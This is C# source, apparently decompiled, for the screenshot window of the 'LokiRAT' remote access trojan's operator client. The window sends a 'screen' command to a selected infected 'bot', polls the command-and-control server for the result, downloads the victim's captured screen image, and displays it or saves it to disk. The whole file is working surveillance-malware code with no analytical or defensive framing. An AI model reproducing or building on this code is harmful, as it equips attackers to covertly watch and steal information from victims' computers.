namespace LokiRAT_Client
{
    using LokiRAT_Server;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Drawing.Drawing2D;
    using System.IO;
    using System.Net;
    using System.Text.RegularExpressions;
    using System.Windows.Forms;

    public class screenshot : Form
    {
        private IContainer components = null;
        private ContextMenuStrip contextMenuStrip1;
        private Image img;
        private string myLastCommand = "-1";
        private ToolStripMenuItem newScreenshotToolStripMenuItem;
        private PictureBox pictureBox1;
        private string pictureUrl;
        private ToolStripMenuItem refreshToolStripMenuItem;
        private SaveFileDialog saveFileDialog1;
        private ToolStripMenuItem saveToolStripMenuItem;
        private System.Windows.Forms.Timer timer1;
        private ToolStripSeparator toolStripSeparator1;

        public screenshot()
        {
            this.InitializeComponent();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(screenshot));
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip1 = new ContextMenuStrip(this.components);
            this.newScreenshotToolStripMenuItem = new ToolStripMenuItem();
            this.saveToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator1 = new ToolStripSeparator();
            this.refreshToolStripMenuItem = new ToolStripMenuItem();
            this.pictureBox1 = new PictureBox();
            this.saveFileDialog1 = new SaveFileDialog();
            this.contextMenuStrip1.SuspendLayout();
            ((ISupportInitialize) this.pictureBox1).BeginInit();
            base.SuspendLayout();
            this.timer1.Enabled = true;
            this.timer1.Interval = 500;
            this.timer1.Tick += new EventHandler(this.timer1_Tick);
            this.contextMenuStrip1.Items.AddRange(new ToolStripItem[] { this.newScreenshotToolStripMenuItem, this.saveToolStripMenuItem, this.toolStripSeparator1, this.refreshToolStripMenuItem });
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new Size(160, 0x4c);
            this.newScreenshotToolStripMenuItem.Image = (Image) manager.GetObject("newScreenshotToolStripMenuItem.Image");
            this.newScreenshotToolStripMenuItem.Name = "newScreenshotToolStripMenuItem";
            this.newScreenshotToolStripMenuItem.Size = new Size(0x9f, 0x16);
            this.newScreenshotToolStripMenuItem.Text = "New Screenshot";
            this.newScreenshotToolStripMenuItem.Click += new EventHandler(this.newScreenshotToolStripMenuItem_Click);
            this.saveToolStripMenuItem.Image = (Image) manager.GetObject("saveToolStripMenuItem.Image");
            this.saveToolStripMenuItem.Name = "saveToolStripMenuItem";
            this.saveToolStripMenuItem.Size = new Size(0x9f, 0x16);
            this.saveToolStripMenuItem.Text = "Save";
            this.saveToolStripMenuItem.Click += new EventHandler(this.saveToolStripMenuItem_Click);
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new Size(0x9c, 6);
            this.refreshToolStripMenuItem.Image = (Image) manager.GetObject("refreshToolStripMenuItem.Image");
            this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
            this.refreshToolStripMenuItem.Size = new Size(0x9f, 0x16);
            this.refreshToolStripMenuItem.Text = "Refresh";
            this.refreshToolStripMenuItem.Click += new EventHandler(this.refreshToolStripMenuItem_Click);
            this.pictureBox1.ContextMenuStrip = this.contextMenuStrip1;
            this.pictureBox1.Dock = DockStyle.Fill;
            this.pictureBox1.Location = new Point(0, 0);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new Size(0x3b8, 0x21a);
            this.pictureBox1.TabIndex = 1;
            this.pictureBox1.TabStop = false;
            this.saveFileDialog1.FileName = "screen.png";
            this.saveFileDialog1.Filter = "PNG pictures|*.png|All Files|*.*";
            this.saveFileDialog1.FileOk += new CancelEventHandler(this.saveFileDialog1_FileOk);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x3b8, 0x21a);
            base.Controls.Add(this.pictureBox1);
            base.Icon = (Icon) manager.GetObject("$this.Icon");
            base.Name = "screenshot";
            this.Text = "Screenshot | LokiRAT";
            this.contextMenuStrip1.ResumeLayout(false);
            ((ISupportInitialize) this.pictureBox1).EndInit();
            base.ResumeLayout(false);
        }

        private void newScreenshotToolStripMenuItem_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=screen");
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
        {
            this.img.Save(this.saveFileDialog1.FileName);
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.saveFileDialog1.ShowDialog();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string[] strArray = new string[5];
            try
            {
                if (main.lastCommand[main.selectedBot] != this.myLastCommand)
                {
                    this.myLastCommand = main.lastCommand[main.selectedBot];
                    strArray = Regex.Split(main.lastCommandText[main.selectedBot], "{-s}");
                    if (strArray[0] == "screen")
                    {
                        this.pictureUrl = main.connectionURL.Substring(0, main.connectionURL.LastIndexOf("/")) + "/" + strArray[1];
                        WebClient client = new WebClient {
                            Proxy = null
                        };
                        MemoryStream stream = new MemoryStream(client.DownloadData(this.pictureUrl));
                        this.img = Image.FromStream(stream);
                        Bitmap image = new Bitmap(this.pictureBox1.Width, this.pictureBox1.Height);
                        Graphics graphics = Graphics.FromImage(image);
                        graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
                        graphics.DrawImage(this.img, 0, 0, this.pictureBox1.Width, this.pictureBox1.Height);
                        graphics.Dispose();
                        this.pictureBox1.Image = image;
                    }
                }
            }
            catch
            {
            }
        }
    }
}

